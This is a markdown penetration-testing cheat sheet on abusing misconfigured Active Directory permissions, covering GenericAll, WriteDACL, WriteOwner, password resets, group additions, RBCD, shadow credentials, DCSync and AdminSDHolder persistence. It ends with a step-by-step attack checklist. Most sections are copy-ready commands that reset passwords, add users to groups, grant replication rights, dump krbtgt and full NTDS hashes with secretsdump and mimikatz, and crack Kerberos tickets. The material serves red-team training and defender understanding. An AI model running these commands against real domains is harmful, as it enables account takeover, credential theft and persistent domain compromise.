# ACL Abuse

Active Directory ACL abuse is based on misconfigured permissions between AD objects.

In AD, users, groups, computers, OUs, GPOs, domains, and certificate templates are securable objects. Their permissions are stored in security descriptors. If one principal has dangerous rights over another object, that relationship can often become a privilege escalation path.

Common examples:

```text
User -> GenericAll -> Group
User -> ForceChangePassword -> User
User -> WriteDACL -> Domain
User -> WriteOwner -> Group
User -> GenericWrite -> Computer
User -> AllExtendedRights -> User
```

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export TARGET_USER=bob
export TARGET_GROUP='IT Admins'
export CONTROLLED_USER=alice
export NEWPASS='NewPassword123!'
export DOMAIN_DN='DC=corp,DC=local'
```

Useful resources:

- [The Hacker Recipes - DACL Abuse](https://www.thehacker.recipes/ad/movement/dacl/)
- [BloodHound - GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [BloodHound - WriteDacl](https://bloodhound.specterops.io/resources/edges/write-dacl)
- [The Hacker Recipes - ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [Impacket](https://github.com/fortra/impacket)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [WADComs](https://wadcoms.github.io/)

---

## ACL Basics

An ACL is an Access Control List.

In Active Directory, ACLs define which principals can perform actions on an object.

Important terms:

| Term | Meaning |
| --- | --- |
| Security descriptor | Full security information of an object. |
| DACL | Discretionary Access Control List, controls access. |
| SACL | System Access Control List, controls auditing. |
| ACE | Access Control Entry inside an ACL. |
| Principal / Trustee | User, group, computer, or SID receiving a right. |
| Owner | Principal that owns the object. |
| Inheritance | Permissions inherited from parent containers. |
| Extended right | Specific AD control right, such as password reset or replication. |

An ACE usually answers:

```text
Who has what right over which object?
```

Example relationship:

```text
CORP\alice has GenericAll over CORP\svc_sql
```

This means:

```text
Principal: CORP\alice
Right: GenericAll
Target: CORP\svc_sql
```

Common dangerous rights:

| Right | Why it matters |
| --- | --- |
| `GenericAll` | Full control over the target object. |
| `GenericWrite` | Can modify many useful attributes. |
| `WriteDACL` | Can modify the target object's permissions. |
| `WriteOwner` | Can take ownership of the target object. |
| `ForceChangePassword` | Can reset a user's password. |
| `AddMember` | Can add members to a group. |
| `AllExtendedRights` | May include password reset or replication rights. |
| `DS-Replication-Get-Changes` | Part of DCSync rights. |
| `DS-Replication-Get-Changes-All` | Part of DCSync rights. |
| `ReadLAPSPassword` | Can read LAPS-managed local admin password. |
| `AllowedToAct` | Resource-Based Constrained Delegation path. |

Common target object types:

| Target | Possible abuse |
| --- | --- |
| User | Reset password, add SPN, shadow credentials, modify attributes. |
| Group | Add controlled user to group. |
| Computer | RBCD, shadow credentials, LAPS read, SPN changes. |
| OU | Abuse inherited rights over child objects. |
| GPO | Modify policy that applies to users/computers. |
| Domain root | DCSync or high-impact domain permissions. |
| AdminSDHolder | Persistence over protected objects. |
| Certificate template | AD CS abuse path. |

PowerView enumeration:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity alice -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
```

Check ACLs for one object:

```powershell
Get-DomainObjectAcl -Identity $env:USERNAME -ResolveGUIDs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
```

Find ACLs involving current user:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReference -match $env:USERNAME}
```

LDAP query for RBCD-like ACL-relevant attribute:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" \
sAMAccountName dNSHostName msDS-AllowedToActOnBehalfOfOtherIdentity
```

BloodHound is usually the easiest way to visualize ACL paths.

Common BloodHound edges:

```text
GenericAll
GenericWrite
WriteDacl
WriteOwner
ForceChangePassword
AddMember
AllExtendedRights
GetChanges
GetChangesAll
Owns
Contains
GpLink
AddAllowedToAct
AllowedToAct
ReadLAPSPassword
```

---

## GenericAll

`GenericAll` means full control over the target object.

It is one of the most powerful ACL rights.

Impact depends on the target type.

| Target type | Common abuse |
| --- | --- |
| User | Reset password, set SPN, shadow credentials, modify attributes. |
| Group | Add controlled user to group. |
| Computer | RBCD, shadow credentials, modify attributes. |
| OU | Control child objects depending on inheritance. |
| GPO | Modify policy. |
| Domain | Add replication rights or other high-impact permissions. |

Check with PowerView:

```powershell
Get-DomainObjectAcl -Identity "TARGET_OBJECT" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}
```

Find interesting paths:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}
```

GenericAll over user: reset password.

PowerView:

```powershell
$SecPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity bob -AccountPassword $SecPassword
```

BloodyAD:

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p "$PASS" set password $TARGET_USER "$NEWPASS"
```

Net RPC:

```bash
net rpc password "$TARGET_USER" "$NEWPASS" -U "$NETBIOS/$USER%$PASS" -S $DC_IP
```

GenericAll over group: add member.

PowerView:

```powershell
Add-DomainGroupMember -Identity "IT Admins" -Members alice
```

Net RPC:

```bash
net rpc group addmem "IT Admins" alice -U "$NETBIOS/$USER%$PASS" -S $DC_IP
```

BloodyAD:

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p "$PASS" add groupMember "$TARGET_GROUP" "$CONTROLLED_USER"
```

GenericAll over computer: set RBCD.

Create machine account if needed and allowed:

```bash
addcomputer.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -computer-name 'ATTACKBOX$' -computer-pass 'MachinePass123!'
```

Set RBCD:

```bash
rbcd.py -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
```

Request ticket:

```bash
getST.py -spn cifs/target.corp.local -impersonate Administrator $DOMAIN/'ATTACKBOX$':'MachinePass123!' -dc-ip $DC_IP
```

Use ticket:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
smbclient.py -k -no-pass $DOMAIN/Administrator@target.corp.local
```

GenericAll over user: targeted Kerberoasting by adding SPN.

PowerView:

```powershell
Set-DomainObject -Identity bob -Set @{serviceprincipalname='fake/http'}
```

Request TGS:

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request-user bob -outputfile bob_tgs.txt
```

Clean SPN after lab validation if required by scope:

```powershell
Set-DomainObject -Identity bob -Clear serviceprincipalname
```

GenericAll over user/computer: shadow credentials if AD CS/Kerberos certificate auth conditions apply.

Certipy:

```bash
certipy shadow add -u "$USER@$DOMAIN" -p "$PASS" -account "$TARGET_USER" -dc-ip $DC_IP
certipy shadow auth -u "$USER@$DOMAIN" -p "$PASS" -account "$TARGET_USER" -dc-ip $DC_IP
```


## GenericWrite

`GenericWrite` allows writing many attributes on the target object.

It is weaker than `GenericAll`, but still often enough for escalation.

Impact depends on target type and writable attributes.

| Target type | Common abuse |
| --- | --- |
| User | Add SPN, shadow credentials, modify logon script attributes. |
| Computer | RBCD, shadow credentials, modify selected attributes. |
| Group | May allow membership changes in some contexts, but AddMember is cleaner. |
| GPO | Modify writable GPO attributes or files depending on access. |

Find GenericWrite:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite"}
```

Check target object:

```powershell
Get-DomainObjectAcl -Identity "TARGET_OBJECT" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite"}
```

GenericWrite over user: add SPN for targeted Kerberoasting.

PowerView:

```powershell
Set-DomainObject -Identity bob -Set @{serviceprincipalname='fake/http'}
```

Request TGS:

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request-user bob -outputfile bob_tgs.txt
```

Crack:

```bash
hashcat -m 13100 bob_tgs.txt /usr/share/wordlists/rockyou.txt
```

Clear SPN after lab validation if needed:

```powershell
Set-DomainObject -Identity bob -Clear serviceprincipalname
```

GenericWrite over user or computer: shadow credentials.

Certipy:

```bash
certipy shadow add -u "$USER@$DOMAIN" -p "$PASS" -account "$TARGET_USER" -dc-ip $DC_IP
certipy shadow auth -u "$USER@$DOMAIN" -p "$PASS" -account "$TARGET_USER" -dc-ip $DC_IP
```

GenericWrite over computer: RBCD may be possible by writing `msDS-AllowedToActOnBehalfOfOtherIdentity`.

Create computer if needed:

```bash
addcomputer.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -computer-name 'ATTACKBOX$' -computer-pass 'MachinePass123!'
```

Set RBCD:

```bash
rbcd.py -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
```

Get ticket:

```bash
getST.py -spn cifs/target.corp.local -impersonate Administrator $DOMAIN/'ATTACKBOX$':'MachinePass123!' -dc-ip $DC_IP
```

PowerView write attribute example:

```powershell
Set-DomainObject -Identity "TARGET_OBJECT" -Set @{description='test'}
```

---

## WriteDACL

`WriteDACL` allows modifying the target object's DACL.

This means the attacker can grant themselves or another controlled principal additional rights over the target.

Typical abuse pattern:

```text
Have WriteDACL over target
  -> grant controlled user GenericAll / DCSync / AddMember
  -> abuse newly granted right
```

Impact depends on target type.

| Target | Common abuse |
| --- | --- |
| User | Grant GenericAll, then reset password or add shadow credentials. |
| Group | Grant AddMember or GenericAll, then add user. |
| Computer | Grant GenericAll, then RBCD or shadow credentials. |
| Domain root | Grant DCSync rights. |
| GPO | Grant rights to modify GPO. |

Find WriteDACL:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteDacl"}
```

Check one object:

```powershell
Get-DomainObjectAcl -Identity "TARGET_OBJECT" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteDacl"}
```

PowerView grant GenericAll:

```powershell
Add-DomainObjectAcl -TargetIdentity "TARGET_OBJECT" -PrincipalIdentity alice -Rights All
```

Grant DCSync rights on domain root:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity alice -Rights DCSync
```

Impacket dacledit grant FullControl:

```bash
dacledit.py -action write -rights FullControl -principal "$CONTROLLED_USER" -target "$TARGET_USER" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
```

Grant DCSync-style rights on domain object:

```bash
dacledit.py -action write -rights DCSync -principal "$CONTROLLED_USER" -target-dn "$DOMAIN_DN" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
```

Read DACL with dacledit:

```bash
dacledit.py -action read -target "$TARGET_USER" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
```

After granting GenericAll over a user, reset password:

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u $CONTROLLED_USER -p "$PASS" set password $TARGET_USER "$NEWPASS"
```

After granting AddMember over a group, add member:

```bash
net rpc group addmem "$TARGET_GROUP" "$CONTROLLED_USER" -U "$NETBIOS/$USER%$PASS" -S $DC_IP
```

After granting DCSync rights, validate:

```bash
secretsdump.py $DOMAIN/$CONTROLLED_USER:"$PASS"@$DC_IP -just-dc-user krbtgt
```


## WriteOwner

`WriteOwner` allows changing the owner of the target object.

Object owners can often modify the DACL of the object. A common pattern is:

```text
Have WriteOwner over target
  -> set owner to controlled user
  -> modify DACL
  -> grant GenericAll or specific right
  -> abuse target
```

Impact depends on target type.

| Target | Common path |
| --- | --- |
| User | Take ownership, grant GenericAll, reset password. |
| Group | Take ownership, grant AddMember/GenericAll, add member. |
| Computer | Take ownership, grant GenericAll, set RBCD. |
| Domain root | Take ownership path may lead to high-impact rights if allowed. |

Find WriteOwner:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteOwner"}
```

Check one object:

```powershell
Get-DomainObjectAcl -Identity "TARGET_OBJECT" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteOwner"}
```

PowerView set owner:

```powershell
Set-DomainObjectOwner -Identity "TARGET_OBJECT" -OwnerIdentity alice
```

Then grant rights:

```powershell
Add-DomainObjectAcl -TargetIdentity "TARGET_OBJECT" -PrincipalIdentity alice -Rights All
```

Impacket owneredit:

```bash
owneredit.py -action write -new-owner "$CONTROLLED_USER" -target "$TARGET_USER" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
```

Then dacledit:

```bash
dacledit.py -action write -rights FullControl -principal "$CONTROLLED_USER" -target "$TARGET_USER" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
```

If target is a user, reset password:

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u $CONTROLLED_USER -p "$PASS" set password $TARGET_USER "$NEWPASS"
```

If target is a group, add member:

```bash
net rpc group addmem "$TARGET_GROUP" "$CONTROLLED_USER" -U "$NETBIOS/$USER%$PASS" -S $DC_IP
```

---

## ForceChangePassword

`ForceChangePassword` allows resetting a user's password without knowing the old password.

This right may appear directly or through broader rights such as:

```text
GenericAll
AllExtendedRights
User-Force-Change-Password
```

This applies to user objects.

Requirements:

| Requirement | Notes |
| --- | --- |
| Target user | User whose password will be reset. |
| Reset right | ForceChangePassword, GenericAll, or AllExtendedRights. |
| New password | Must satisfy domain policy. |
| Validation path | SMB, LDAP, WinRM, Kerberos, etc. |

Find ForceChangePassword:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "User-Force-Change-Password"}
```

PowerView reset:

```powershell
$SecPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity bob -AccountPassword $SecPassword
```

Net RPC:

```bash
net rpc password "$TARGET_USER" "$NEWPASS" -U "$NETBIOS/$USER%$PASS" -S $DC_IP
```

BloodyAD:

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p "$PASS" set password $TARGET_USER "$NEWPASS"
```

RPCClient sometimes works depending on rights and environment:

```bash
rpcclient -U "$NETBIOS/$USER%$PASS" $DC_IP -c "setuserinfo2 $TARGET_USER 23 '$NEWPASS'"
```

Validate new credential:

```bash
nxc smb $DC_IP -u $TARGET_USER -p "$NEWPASS" -d $DOMAIN
nxc ldap $DC_IP -u $TARGET_USER -p "$NEWPASS" -d $DOMAIN
nxc winrm $RANGE -u $TARGET_USER -p "$NEWPASS" -d $DOMAIN
```

Possible issues:

| Issue | Meaning |
| --- | --- |
| Password policy error | New password does not meet policy. |
| Access denied | Right is missing or protected object behavior. |
| Account locked/disabled | Credential may be valid but account unusable. |
| Replication delay | Validate against same DC first. |
| User impact | Password reset changes target user's password. |


---

## AddMember

`AddMember` allows adding a principal to a group.

It may appear as a direct right or through broader rights such as `GenericAll` over the group.

Common abuse:

```text
Have AddMember over group
  -> add controlled user to group
  -> refresh token / logon again
  -> use new group privileges
```

Requirements:

| Requirement | Notes |
| --- | --- |
| Target group | Group receiving new member. |
| Controlled principal | User/computer/group to add. |
| AddMember or equivalent right | Direct or through GenericAll. |
| New logon/token | Required to receive updated group SID in token. |

Find AddMember:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "AddMember"}
```

PowerView:

```powershell
Add-DomainGroupMember -Identity "IT Admins" -Members alice
```

Net RPC:

```bash
net rpc group addmem "$TARGET_GROUP" "$CONTROLLED_USER" -U "$NETBIOS/$USER%$PASS" -S $DC_IP
```

BloodyAD:

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p "$PASS" add groupMember "$TARGET_GROUP" "$CONTROLLED_USER"
```

AD module:

```powershell
Add-ADGroupMember -Identity "IT Admins" -Members alice
```

Verify membership:

```bash
net rpc group members "$TARGET_GROUP" -U "$NETBIOS/$USER%$PASS" -S $DC_IP
```

PowerView:

```powershell
Get-DomainGroupMember -Identity "IT Admins"
```

LDAP:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(&(objectClass=group)(cn=IT Admins))" member
```

Refresh token:

```text
Log out and log back in
Request a new TGT
Start a new session
```

Linux Kerberos refresh:

```bash
getTGT.py $DOMAIN/$CONTROLLED_USER:"$PASS" -dc-ip $DC_IP
export KRB5CCNAME=$PWD/$CONTROLLED_USER.ccache
klist
```

---

## AllExtendedRights

`AllExtendedRights` grants all extended rights on the target object.

Impact depends on the object type.

Common extended rights:

| Extended right | Meaning |
| --- | --- |
| User-Force-Change-Password | Reset user password. |
| DS-Replication-Get-Changes | Replication right used for DCSync. |
| DS-Replication-Get-Changes-All | Replication right used for DCSync. |
| DS-Replication-Get-Changes-In-Filtered-Set | Additional replication-related right. |

On a user object, `AllExtendedRights` often means password reset is possible.

On the domain root, extended replication rights may mean DCSync is possible.

Find AllExtendedRights:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "ExtendedRight"}
```

Check target object:

```powershell
Get-DomainObjectAcl -Identity "TARGET_OBJECT" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "ExtendedRight"}
```

If target is a user, try password reset:

```powershell
$SecPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force
Set-DomainUserPassword -Identity bob -AccountPassword $SecPassword
```

Linux:

```bash
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p "$PASS" set password $TARGET_USER "$NEWPASS"
```

If target is domain root and replication rights exist, try DCSync validation:

```bash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
```

PowerView DCSync right grant if combined with WriteDACL:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity alice -Rights DCSync
```

---

## DCSync Rights

DCSync abuses directory replication permissions.

If a principal has the required replication rights on the domain object, it can ask a domain controller to replicate password data for domain accounts.

This is a domain-compromise-level path.

Required rights commonly include:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

Sometimes also relevant:

```text
DS-Replication-Get-Changes-In-Filtered-Set
```

BloodHound edges:

```text
GetChanges
GetChangesAll
GetChangesInFilteredSet
DCSync
```

Check DCSync-related ACLs with PowerView:

```powershell
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs | Where-Object {
    $_.ObjectAceType -match "DS-Replication"
}
```

Find interesting domain ACLs:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.ObjectDN -match "DC=corp,DC=local" -and $_.ObjectAceType -match "Replication"
}
```

Grant DCSync rights if you have WriteDACL over domain root:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity alice -Rights DCSync
```

Impacket dacledit grant DCSync:

```bash
dacledit.py -action write -rights DCSync -principal "$CONTROLLED_USER" -target-dn "$DOMAIN_DN" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
```

Validate DCSync with Impacket:

```bash
secretsdump.py $DOMAIN/$CONTROLLED_USER:"$PASS"@$DC_IP -just-dc-user krbtgt
```

Dump one user:

```bash
secretsdump.py $DOMAIN/$CONTROLLED_USER:"$PASS"@$DC_IP -just-dc-user Administrator
```

Dump domain secrets in a lab when explicitly allowed:

```bash
secretsdump.py $DOMAIN/$CONTROLLED_USER:"$PASS"@$DC_IP -just-dc
```

With hash:

```bash
secretsdump.py $DOMAIN/$CONTROLLED_USER@$DC_IP -hashes :$NTLM -just-dc-user krbtgt
```

Mimikatz:

```cmd
mimikatz.exe
lsadump::dcsync /domain:corp.local /user:krbtgt
```

DCSync result artifacts:

| Artifact | Meaning |
| --- | --- |
| NTDS hashes | Domain account hashes. |
| krbtgt hash | Enables Golden Ticket paths. |
| AES keys | Kerberos key material. |
| Supplemental credentials | Additional credential data. |


---

## AdminSDHolder

AdminSDHolder is a special AD object used to protect privileged users and groups.

Its ACL is used as a template for protected objects.

Default location:

```text
CN=AdminSDHolder,CN=System,DC=corp,DC=local
```

Protected objects include members of high-privilege groups such as:

```text
Domain Admins
Enterprise Admins
Schema Admins
Administrators
Account Operators
Server Operators
Backup Operators
Print Operators
```

If an attacker can modify the AdminSDHolder ACL, they may create a persistent permission path to protected objects.

Find AdminSDHolder:

```powershell
Get-DomainObject -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local"
```

View AdminSDHolder ACL:

```powershell
Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs
```

Add ACL entry if you have rights:

```powershell
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity alice -Rights All
```

LDAP DN:

```text
CN=AdminSDHolder,CN=System,DC=corp,DC=local
```

Impacket dacledit example:

```bash
dacledit.py -action write -rights FullControl -principal "$CONTROLLED_USER" \
-target-dn "CN=AdminSDHolder,CN=System,$DOMAIN_DN" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
```

Check protected users with `adminCount=1`:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(adminCount=1)" sAMAccountName distinguishedName memberOf
```

PowerView:

```powershell
Get-DomainUser -AdminCount
Get-DomainGroup -AdminCount
```


---

## SDProp

SDProp is the process that applies AdminSDHolder security settings to protected objects.

It periodically compares protected objects with the AdminSDHolder ACL and reapplies the protected security descriptor.

The important relationship is:

```text
AdminSDHolder ACL
  -> SDProp process
  -> protected users and groups
```

Protected objects often have:

```text
adminCount=1
```

and inheritance disabled.

Find protected users:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" \
sAMAccountName distinguishedName memberOf
```

Find protected groups:

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "$DOMAIN_DN" "(&(objectClass=group)(adminCount=1))" \
cn distinguishedName member
```

PowerView:

```powershell
Get-DomainUser -AdminCount
Get-DomainGroup -AdminCount
```

Check ACL before and after AdminSDHolder modification:

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Get-DomainObjectAcl -Identity "Administrator" -ResolveGUIDs
```

Manual SDProp trigger may require high privileges and is usually not needed in basic labs.

Common timing note:

```text
SDProp runs periodically, so changes may not appear immediately.
```

---

## ACL Attack Checklist

- [ ] **Confirm current identity**

  ```bash
  nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN
  ```

  Windows:

  ```cmd
  whoami
  whoami /groups
  ```

  Record:

  ```text
  Current user:
  Groups:
  Domain:
  DC:
  Credential type:
  ```

- [ ] **Collect ACL data**

  PowerView:

  ```powershell
  Find-InterestingDomainAcl -ResolveGUIDs
  ```

  BloodHound / SharpHound:

  ```powershell
  .\SharpHound.exe -c All
  ```

  Linux collector:

  ```bash
  bloodhound-python -u $USER -p "$PASS" -d $DOMAIN -ns $DC_IP -c All
  ```

  NetExec BloodHound:

  ```bash
  nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --bloodhound --collection All --dns-server $DC_IP
  ```

  Record:

  ```text
  Collector:
  Collection methods:
  Imported:
  Owned user marked:
  Interesting ACL edges:
  ```

- [ ] **Identify dangerous rights**

  Look for:

  ```text
  GenericAll
  GenericWrite
  WriteDACL
  WriteOwner
  ForceChangePassword
  AddMember
  AllExtendedRights
  GetChanges
  GetChangesAll
  ReadLAPSPassword
  AddAllowedToAct
  AllowedToAct
  ```

  Record:

  ```text
  Principal:
  Target:
  Right:
  Target type:
  Inherited:
  Path length:
  ```

- [ ] **Match right to abuse path**

  | Right | Common abuse |
  | --- | --- |
  | GenericAll over user | Reset password, shadow credentials, targeted Kerberoast. |
  | GenericAll over group | Add member. |
  | GenericAll over computer | RBCD or shadow credentials. |
  | GenericWrite over user | Add SPN or shadow credentials. |
  | GenericWrite over computer | RBCD or shadow credentials. |
  | WriteDACL | Grant yourself GenericAll or DCSync. |
  | WriteOwner | Take ownership, then modify DACL. |
  | ForceChangePassword | Reset target user password. |
  | AddMember | Add controlled user to group. |
  | AllExtendedRights over user | Reset password. |
  | Replication rights | DCSync. |
  | AdminSDHolder write | Protected-object persistence path. |

- [ ] **Validate target type**

  ```text
  User
  Group
  Computer
  OU
  GPO
  Domain root
  AdminSDHolder
  Certificate template
  ```

  PowerView examples:

  ```powershell
  Get-DomainUser -Identity target
  Get-DomainGroup -Identity target
  Get-DomainComputer -Identity target
  Get-DomainOU -Identity target
  ```

- [ ] **Execute minimal abuse**

  Add group member:

  ```bash
  net rpc group addmem "$TARGET_GROUP" "$CONTROLLED_USER" -U "$NETBIOS/$USER%$PASS" -S $DC_IP
  ```

  Reset password:

  ```bash
  bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p "$PASS" set password $TARGET_USER "$NEWPASS"
  ```

  Grant rights with WriteDACL:

  ```bash
  dacledit.py -action write -rights FullControl -principal "$CONTROLLED_USER" -target "$TARGET_USER" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
  ```

  Set owner:

  ```bash
  owneredit.py -action write -new-owner "$CONTROLLED_USER" -target "$TARGET_USER" "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
  ```

  Set RBCD:

  ```bash
  rbcd.py -delegate-from 'ATTACKBOX$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
  ```

  DCSync validation:

  ```bash
  secretsdump.py $DOMAIN/$USER:"$PASS"@$DC_IP -just-dc-user krbtgt
  ```

- [ ] **Refresh session or token**

  After group changes:

  ```text
  Log out and log back in
  Request a new TGT
  Start a new shell/session
  ```

  Linux Kerberos:

  ```bash
  getTGT.py $DOMAIN/$CONTROLLED_USER:"$PASS" -dc-ip $DC_IP
  export KRB5CCNAME=$PWD/$CONTROLLED_USER.ccache
  klist
  ```

- [ ] **Validate access**

  ```bash
  nxc smb $DC_IP -u $CONTROLLED_USER -p "$PASS" -d $DOMAIN
  nxc ldap $DC_IP -u $CONTROLLED_USER -p "$PASS" -d $DOMAIN
  nxc winrm $RANGE -u $CONTROLLED_USER -p "$PASS" -d $DOMAIN
  ```

  Kerberos:

  ```bash
  nxc smb $DC_HOST -k --use-kcache
  ```

- [ ] **Record evidence**

  ```text
  Before state:
  Right observed:
  Command used:
  After state:
  New membership/ACL/password/ticket:
  Validation:
  Impact:
  ```
